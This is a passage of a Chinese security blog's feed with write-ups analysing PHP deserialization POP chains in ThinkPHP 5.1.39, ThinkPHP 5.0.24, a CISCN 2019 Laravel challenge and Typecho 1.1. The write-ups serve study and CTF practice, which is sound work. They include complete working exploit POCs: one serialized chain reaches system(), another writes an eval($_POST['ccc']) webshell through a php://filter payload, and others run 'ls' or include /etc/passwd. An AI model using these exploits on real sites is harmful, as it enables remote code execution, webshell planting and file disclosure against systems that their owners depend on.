<strong>param()</strong> 中 <strong>$name</strong>也是可控的，再看 <strong>input()</strong> 方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">    public function input($data &#x3D; [], $name &#x3D; &#39;&#39;, $default &#x3D; null, $filter &#x3D; &#39;&#39;)</span><br><span class="line">    &#123;</span><br><span class="line">        if (false &#x3D;&#x3D;&#x3D; $name) &#123;</span><br><span class="line">            &#x2F;&#x2F; 获取原始数据</span><br><span class="line">            return $data;</span><br><span class="line">        &#125;</span><br><span class="line">        ······</span><br><span class="line"></span><br><span class="line">            $data &#x3D; $this-&gt;getData($data, $name);</span><br><span class="line">            ······</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 解析过滤器</span><br><span class="line">        $filter &#x3D; $this-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">        if (is_array($data)) &#123;</span><br><span class="line">            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</span><br><span class="line">            ······</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $this-&gt;filterValue($data, $name, $filter);</span><br><span class="line">······</span><br></pre></td></tr></table></figure><p><strong>$data</strong> 来自 <strong>getData()</strong> 方法， <strong>$filter</strong> 来自 <strong>getFilter()</strong> ,先看一下 <strong>getData()</strong> </p><p><img src="/inages/thinkphp5.1.39/20200916125029.png" alt=""></p><p>这里 <strong>$data = $data[$val] = $data[$name]</strong> ，而 <strong>$name</strong> 是可控的，所以我们的 <strong>$data</strong> 也是可控的，<br>再看一下 <strong>getFilter()</strong> </p><p><img src="/images/thinkphp5.1.39/20200916125457.png" alt=""></p><p><strong>$filter = $filter ?: $this-&gt;filter;</strong>，也是可控的。<br>所以在 <strong>input()</strong>中调用 <strong>filterValue()</strong> 方法时的参数 <strong>$data</strong> 和 <strong>$filter</strong> 都是可控的，也就是 <strong>filterValue()</strong> 中我们调用 <strong>call_user_func</strong> 时的参数，这样整条pop链就算构造完成了。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">namespace think &#123;</span><br><span class="line">class Request &#123;</span><br><span class="line">protected $hook &#x3D; [];</span><br><span class="line">protected $filter;</span><br><span class="line">protected $config &#x3D; [];</span><br><span class="line">protected $param &#x3D; [];</span><br><span class="line">function __construct() &#123;</span><br><span class="line">$this-&gt;hook &#x3D; [&#39;stringify&#39;&#x3D;&gt;[$this,&quot;isAjax&quot;]];</span><br><span class="line">$this-&gt;filter &#x3D; [&#39;system&#39;];</span><br><span class="line">$this-&gt;config[&#39;var_ajax&#39;] &#x3D; &#39;1&#39;;</span><br><span class="line">$this-&gt;param &#x3D; [&#39;calc&#39;,&#39;1&#39;&#x3D;&gt;&#39;calc&#39;];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Prophecy\Argument\Token &#123;</span><br><span class="line">use think\Request;</span><br><span class="line">class ExactValueToken &#123;</span><br><span class="line">    private $value;</span><br><span class="line">    private $string;</span><br><span class="line">    private $util;</span><br><span class="line">    function __construct() &#123;</span><br><span class="line">    $this-&gt;string &#x3D; null;</span><br><span class="line">    $this-&gt;util &#x3D; new Request();</span><br><span class="line">    $this-&gt;value &#x3D; [&#39;111&#39;];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\process\pipes &#123;</span><br><span class="line">use Prophecy\Argument\Token\ExactValueToken;</span><br><span class="line">class Windows &#123;</span><br><span class="line">private $files &#x3D; [];</span><br><span class="line">function __construct() &#123;</span><br><span class="line">$this-&gt;files &#x3D; [new ExactValueToken()];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new Windows();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行成功</p><p><img src="/images/thinkphp5.1.39/20200916130058.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;thinkphp5.1.39&lt;br&gt;php7.3&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;从网上下载好源码，打开 &lt;strong&gt;application\index\controller\Index.php&lt;/strong&gt; 文件写入如下代码：&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>thinkphp5.0.24反序列化pop链分析</title>
    <link href="http://yoursite.com/2020/09/13/thinkphp5-rce/"/>
    <id>http://yoursite.com/2020/09/13/thinkphp5-rce/</id>
    <published>2020-09-13T08:01:55.233Z</published>
    <updated>2020-09-16T05:02:34.045Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="关于本文"><a href="#关于本文" class="headerlink" title="关于本文"></a>关于本文</h2><p>这篇是对thinkphp5.0.24反序列化漏洞的复现，因为代码量有点大，分析起来属实让人自闭，看的我头疼。<br>本文分析会附带poc。</p><a id="more"></a><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>从网上下载下来此版本的代码，然后打开 <strong>application\index\controller\index.php</strong>，写下如下代码。</p><p><img src="/images/thinkphp5.0.24/20200913175057.png" alt=""></p><p>phpstorm+xdebug配置，下载一个chrome插件：<strong>xdebug helper</strong>，跟着网上教程设置一下，然后phpstorm监听，就可以断点单步跟踪调试了。<br>然后还开了框架的debug模式。</p><p><img src="/images/thinkphp5.0.24/20200913180513.png" alt=""></p><h2 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h2><p>全局搜索一下<strong>__destruct()</strong>方法，在<strong>Windows</strong>类中发现一个可以利用的。</p><p><img src="/images/thinkphp5.0.24/20200913180841.png" alt=""></p><p>跟进removeFiles()方法</p><p><img src="/images/thinkphp5.0.24/20200913181028.png" alt=""></p><p>这里的<strong>file_exists()</strong>函数会触发<strong>__toString()</strong>方法，全局搜索__tostring()，在<strong>Model</strong>类中发现可以利用的，因为Model是抽象类，不能被实例化为对象，必须找到他的子类<strong>Pivot</strong>，父类中的方法子类是可以继承的嘛，一会用<strong>Pivot</strong>就好了。</p><p><img src="/images/thinkphp5.0.24/20200913181459.png" alt=""><br><img src="/images/thinkphp5.0.24/20200913181556.png" alt=""></p><p><strong>__toStrint()</strong> =&gt; <strong>toJson()</strong> =&gt; <strong>toArray()</strong></p><p>跟进toArray()方法，这个方法前半部分是没有用的，不用管他，直接看后半部分</p><p><img src="/images/thinkphp5.0.24/20200913182049.png" alt=""></p><p>看这一行代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$item[$key] &#x3D; $value ? $value-&gt;getAttr($attr) : null;</span><br></pre></td></tr></table></figure><p>这里的 <strong>value</strong> 和 <strong>attr</strong> 都是可控的，这不是正好可以触发<strong>__call</strong>方法吗，于是向前看看这两个变量是怎么来的。<br>首先 <strong>this-&gt;append</strong>不为空且为数组，数组里面的值不能为数组，并且不能包含点号。这个 <code>loader::parseName()</code> 就是转换大小写的函数，不用管。然后往下第902行，如果 <code>$this-&gt;$relation()</code> 存在并且把其返回值赋值给 <strong>$modeRelation</strong> 。<br>因为这里是 <code>$this-&gt;$relation()</code> 而不是 <code>$this-&gt;relation()</code> ，我们便可以通过 <strong>$relation</strong>参数调用这个类中的任意方法<br>往下找了找找到了这个方法，可以返回任意值。</p><p><img src="/images/thinkphp5.0.24/20200913184226.png" alt=""></p><p>然后下面这行代码，调用了 <strong>$modeRelation</strong> 作为参数，并且把返回值传给 <strong>$value</strong> ，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value         &#x3D; $this-&gt;getRelationData($modelRelation);</span><br></pre></td></tr></table></figure><p>跟进一下</p><p><img src="/images/thinkphp5.0.24/20200913184844.png" alt=""></p><p>这里又一个if/else分支，按道理来说if为真时完全可以达成一条完整的pop链，把 <strong>$this-&gt;parent</strong> 的值赋值给value，然后再往下触发<strong>__call</strong> 即可，但不知道为什么复现时候老是报错，没办法执行，真难，艹。</p><p>然后又找到了另一条链子，这里就不看没成功的那个了，回头有时间再看看。<br>看646行，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$value &#x3D; $modelRelation-&gt;getRelation();</span><br></pre></td></tr></table></figure><p>调用了 <strong>getRelation</strong> 方法，我们要找一个有这个方法并且返回值可控的，于是在 <strong>HasOne</strong> 这个类中找到了这个方法，看一下</p><p><img src="/images/thinkphp5.0.24/20200913191222.png" alt=""></p><p>看第53、54行，这里两个参数都是可控的，在这里可以触发 <strong>__call()</strong> 。</p><p>可调用的 <strong>__call()</strong> 在 <strong>Output</strong> 类中：</p><p><img src="/images/thinkphp5.0.24/20200913192538.png" alt=""></p><p>跟进 <strong>Output</strong> 类 <strong>block</strong> 方法</p><p><img src="/images/thinkphp5.0.24/20200913192810.png" alt=""></p><p>跟进 <strong>writeIn</strong> 方法</p><p><img src="/images/thinkphp5.0.24/20200913192900.png" alt=""></p><p>跟进 <strong>write</strong> 方法</p><p><img src="/images/thinkphp5.0.24/20200913192950.png" alt=""></p><p>这里可以调用任意类的write方法，全局搜索一下write方法，在 <strong>Memcache</strong> 类中的 <strong>write</strong> 可以调用任意类的 <strong>set</strong>方法。</p><p><img src="/images/thinkphp5.0.24/20200913193105.png" alt=""></p><p>寻找 <strong>set</strong> 方法，在 <strong>File</strong> 类中，</p><p><img src="/images/thinkphp5.0.24/20200913193447.png" alt=""></p><p>需要使用伪协议绕过exit()使用file_put_contents()写入shell，<br>这里第一次调用 <strong>set</strong> 参数是不可控的，无法写shell，真正写shell是利用 <strong>setTagItem()</strong> 方法第二次调用set，然后就可以写入shell了。</p><p>中途写好后运行了几次无法在windows中复现成功，于是参考了这里：</p><blockquote><p><a href="https://xz.aliyun.com/t/7457#toc-3">https://xz.aliyun.com/t/7457#toc-3</a></p></blockquote><p>下面是最后的POC：</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;File类</span><br><span class="line">namespace think\cache\driver;</span><br><span class="line">class File</span><br><span class="line">&#123;</span><br><span class="line">    protected $tag&#x3D;&#39;sodayo&#39;;</span><br><span class="line">    protected $options &#x3D; [</span><br><span class="line">        &#39;expire&#39;        &#x3D;&gt; 0,</span><br><span class="line">        &#39;cache_subdir&#39;  &#x3D;&gt; false,</span><br><span class="line">        &#39;prefix&#39;        &#x3D;&gt; false,</span><br><span class="line">        &#39;path&#39;          &#x3D;&gt; &#39;php:&#x2F;&#x2F;filter&#x2F;convert.iconv.utf-8.utf-7|convert.base64-decode&#x2F;resource&#x3D;aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g&#x2F;..&#x2F;a.php&#39;, &#x2F;&#x2F;这里是欲写入的PHP被rot13后的结果</span><br><span class="line">        &#39;data_compress&#39; &#x3D;&gt; false,</span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Memcached类</span><br><span class="line">namespace think\session\driver;</span><br><span class="line">use think\cache\driver\File;</span><br><span class="line">class Memcached</span><br><span class="line">&#123;</span><br><span class="line">    protected $handler;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;handler&#x3D;new File();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Output类</span><br><span class="line">namespace think\console;</span><br><span class="line">use think\session\driver\Memcached;</span><br><span class="line">class Output</span><br><span class="line">&#123;</span><br><span class="line">    protected $styles &#x3D; [&#39;removeWhereField&#39;];</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;handle&#x3D;new Memcached();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;HasOne类</span><br><span class="line">namespace think\model\relation;</span><br><span class="line">use think\console\Output;</span><br><span class="line">class HasOne</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F;protected $foreignKey&#x3D;&quot;sss&quot;; &#x2F;&#x2F;$this-&gt;query-&gt;removeWhereField($this-&gt;foreignKey)</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;query&#x3D;new Output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;Pivot类</span><br><span class="line">namespace think\model;</span><br><span class="line">use think\model\relation\HasOne;</span><br><span class="line">class Pivot</span><br><span class="line">&#123;</span><br><span class="line">    protected $append &#x3D; [&#39;getError&#39;];</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;error&#x3D;new HasOne();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;Windows类</span><br><span class="line">namespace think\process\pipes;</span><br><span class="line">use think\model\Pivot;</span><br><span class="line">class Windows</span><br><span class="line">&#123;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;files&#x3D;[new Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$x&#x3D;new Windows();</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($x));</span><br></pre></td></tr></table></figure><p>运行后生成a.php6218150bbcad1e6eec78da4604c4b6c7.php，其中包含了一个eval($_POST[‘ccc’])</p><p><img src="/images/thinkphp5.0.24/20200913204939.png" alt=""></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>只想说是真的难，和平时比赛中的反序列化链子完全不是一个级别的。然后总之就是多审链子，还是太菜了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;关于本文&quot;&gt;&lt;a href=&quot;#关于本文&quot; class=&quot;headerlink&quot; title=&quot;关于本文&quot;&gt;&lt;/a&gt;关于本文&lt;/h2&gt;&lt;p&gt;这篇是对thinkphp5.0.24反序列化漏洞的复现，因为代码量有点大，分析起来属实让人自闭，看的我头疼。&lt;br&gt;本文分析会附带poc。&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ciscn2019 laravel反序列化利用链</title>
    <link href="http://yoursite.com/2020/09/10/ciscn-laravel1/"/>
    <id>http://yoursite.com/2020/09/10/ciscn-laravel1/</id>
    <published>2020-09-10T11:16:48.000Z</published>
    <updated>2020-09-16T05:11:08.119Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]<br>这几天总想着审点反序列化的链子，结果刚好在buu上看到一道不错的题，刚好练练手。<a id="more"></a><br>打开页面就是简短的代码告诉我们是反序列化，然后根据提示下载下来源码。用的是laravel框架，讲实话这种框架的代码好难看懂，不懂这个<code>index.php</code>是怎么执行的，然后边查资料边看终于懂了一点点。</p><h2 id="路由信息"><a href="#路由信息" class="headerlink" title="路由信息"></a>路由信息</h2><p>首先要查看路由信息，所有的Laravel路由都是在routes目录下的路由文件中，这些文件通过框架自动加载。routes/web.php文件定义了web界面的路由，这些路由被分配了web中间件组，从而可以提供session和csrf防护等功能。routes/api.php中的路由是无状态的，被分配了 api 中间件组。<br>对大多数应用而言，都是从 routes/web.php 文件开始定义路由。</p><p><img src="/images/ciscn_laravel/20200910194248.png" alt=""></p><p>我们可以看到在web.php中自动加载了IndexController类中的index方法。明白了他为什么这样运行之后就可以开始看代码了。</p><h2 id="反序列化利用"><a href="#反序列化利用" class="headerlink" title="反序列化利用"></a>反序列化利用</h2><p><img src="/images/ciscn_laravel/20200910194740.png" alt=""></p><p>很明了的反序列化。<br>看这种反序列化一般都是直接全局搜索魔法函数，看看有没有可用的 <code>__destruct(),__wakeup(),__toString(),__call()</code> 等等。就先看__destruct()吧，一搜一堆，心态崩了，看了半天终于看到一个能用的，在TagAwareAdapter.php的<strong>TagAwareAdapter</strong>类里面。</p><p><img src="/images/ciscn_laravel/20200910195422.png" alt=""></p><p><strong>__destruct</strong>调用了 <code>commit</code> 方法，然后 <code>commit()</code> 又调用了 <code>invalidateTags()</code> 方法，跟进这个方法。<br><img src="/images/ciscn_laravel/20200910224023.png" alt=""><br>在第125行，<code>$this-&gt;pool-&gt;saveDeferred($item)</code>这种可以触发<code>__call</code>方法，但我把__call都看了一遍发现没有可以利用的。然后想到了可以调用别的类的<code>saveDeferred()</code>方法。然后全局搜索了一下这个方法找到两个可用的。<br>第一个是在 <code>ProxyAdapter.php</code> 中,第二个是在 <code>PhpArrayAdapter.php</code> 中，分别看一下这两个方法，也对应两个exp。</p><h3 id="ProxyAdapter-php"><a href="#ProxyAdapter-php" class="headerlink" title="ProxyAdapter.php"></a>ProxyAdapter.php</h3><p><img src="/images/ciscn_laravel/20200910224927.png" alt=""></p><p><img src="/images/ciscn_laravel/20200910225107.png" alt=""></p><p> <strong>saveDeferred()</strong> 先调用了 <strong>dosave()</strong> 方法，然后在 <strong>dosave()</strong> 的223行，也就是红框中的部分有任意函数执行，函数名是可控的，就是 <strong>$this-&gt;setInnerItem</strong> ，函数参数也是可控的。</p><p><img src="/images/ciscn_laravel/20200910225648.png" alt=""></p><p>当满足if条件的时候，会把 <strong>$item[“\0*\0innerItem”]</strong> 的值赋给 <strong>$innerItem</strong>。再往前看</p><p><img src="/images/ciscn_laravel/20200910225944.png" alt=""></p><p><strong>instanceof</strong>是检查一个变量是否是一个类的实例化。这个if语句就是，如果$item不是CacheItem类的实例化，就退出。只要赋值$item为CacheItem类的实例化即可。</p><p><img src="/images/ciscn_laravel/20200910231026.png" alt=""></p><p>system()有第二个参数，这个第二个参数的意思实际上是将执行结果保存到<strong>return_var</strong>变量,所以这只能是个变量名，这里把return_var的值直接放进函数里是不行的，我试了一下<strong>return_var</strong>参数是int型和数组型都可以，所以跟变量类型无关。<br>然后便可以写exp，要注意命名空间。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Symfony\Component\Cache\Adapter &#123;</span><br><span class="line">class ProxyAdapter&#123;</span><br><span class="line">private $setInnerItem;</span><br><span class="line">function __construct()&#123;</span><br><span class="line">$this-&gt;setInnerItem &#x3D; &#39;system&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Symfony\Component\Cache &#123;</span><br><span class="line">class CacheItem&#123;</span><br><span class="line">protected $innerItem;</span><br><span class="line">function __construct() &#123;</span><br><span class="line">$this-&gt;innerItem &#x3D; &#39;ls&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Symfony\Component\Cache\Adapter &#123;</span><br><span class="line">use Symfony\Component\Cache\CacheItem;</span><br><span class="line">class TagAwareAdapter&#123;</span><br><span class="line">private $deferred &#x3D; [];</span><br><span class="line">private $pool;</span><br><span class="line">function __construct()&#123;</span><br><span class="line">$this-&gt;deferred &#x3D; array(&#39;123&#39;&#x3D;&gt; new CacheItem());</span><br><span class="line">$this-&gt;pool &#x3D; new ProxyAdapter();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new TagAwareAdapter();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PhpArrayAdapter-php"><a href="#PhpArrayAdapter-php" class="headerlink" title="PhpArrayAdapter.php"></a>PhpArrayAdapter.php</h3><p>再来看第二个</p><p><img src="/images/ciscn_laravel/20200910231525.png" alt=""></p><p>调用了initialize()方法，跟进一下，在<strong>PhpArrayTrait</strong>类中，这里的<strong>trait</strong>是什么意思呢？</p><blockquote><p>Trait 是为类似 PHP 的单继承语言而准备的一种代码复用机制。Trait 为了减少单继承语言的限制，使开发人员能够自由地在不同层次结构内独立的类中复用 method。 Trait 和 Class 组合的语义定义了一种减少复杂性的方式，避免传统多继承和 Mixin 类相关典型问题。</p></blockquote><p>简单来说就是一种多继承的方式，<code>PhpArrayTrait</code>也就是<code>PhpArrayAdapter</code>的父类。当在子类中找不到方法时会自动进入父类中寻找，这也就是为什么跟进到的<code>initialize()</code>在PhpArrayTrait类中。<br>下面看一下这个方法。</p><p><img src="/images/ciscn_laravel/20200910232316.png" alt=""></p><p>中间的include参数中存在变量，存在任意文件包含。构造一下exp。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Symfony\Component\Cache &#123;</span><br><span class="line">class CacheItem&#123;</span><br><span class="line">protected $innerItem;</span><br><span class="line">function __construct() &#123;</span><br><span class="line">$this-&gt;innerItem &#x3D; &#39;ls&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Symfony\Component\Cache\Adapter &#123;</span><br><span class="line">use Symfony\Component\Cache\CacheItem;</span><br><span class="line">class PhpArrayAdapter&#123;</span><br><span class="line">private $values;</span><br><span class="line">private $file;</span><br><span class="line">function __construct()&#123;</span><br><span class="line">$this-&gt;values &#x3D; null;</span><br><span class="line">$this-&gt;file &#x3D; &#39;&#x2F;etc&#x2F;passwd&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">class TagAwareAdapter&#123;</span><br><span class="line">private $deferred &#x3D; [];</span><br><span class="line">private $pool;</span><br><span class="line">function __construct()&#123;</span><br><span class="line">$this-&gt;deferred &#x3D; array(&#39;123&#39;&#x3D;&gt; new CacheItem());</span><br><span class="line">$this-&gt;pool &#x3D; new PhpArrayAdapter();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a &#x3D; new TagAwareAdapter();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>到这里差不多就结束了，还是太菜了，得多审点链子，多多看代码。太菜了太菜了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;[toc]&lt;br&gt;这几天总想着审点反序列化的链子，结果刚好在buu上看到一道不错的题，刚好练练手。
    
    </summary>
    
    
      <category term="代码审计" scheme="http://yoursite.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="反序列化" scheme="http://yoursite.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>typecho反序列化利用链分析</title>
    <link href="http://yoursite.com/2020/09/03/typecho-1-1/"/>
    <id>http://yoursite.com/2020/09/03/typecho-1-1/</id>
    <published>2020-09-03T10:49:54.000Z</published>
    <updated>2020-09-11T02:13:22.211Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]<br>上次国赛有一道这个题，<strong>baby_serialize</strong>，看了好久也没做出来，感觉自己代码审计能力太差了，于是乎想找几个cms审审反序列化的链子，于是就有了这篇。<a id="more"></a><br>找的是typecho1.1的那个漏洞，呜呜呜太菜了，因为是第一次，还是一边看师傅博客一边完成的，此处膜拜P3师傅。因为现在的版本漏洞已经修复了，搭环境还浪费了好长时间，真的心累。</p><p><img src="/images/typecho1.1/20200903190745.png" alt=""></p><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>漏洞利用的地方是在<strong>install.php</strong>，这里只是验证了一下有没有get提交finish参数，若没有则退出，有的话再继续往下进行，先看看利用点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php else : ?&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">    $config &#x3D; unserialize(base64_decode(Typecho_Cookie::get(&#39;__typecho_config&#39;)));</span><br><span class="line">    Typecho_Cookie::delete(&#39;__typecho_config&#39;);</span><br><span class="line">    $db 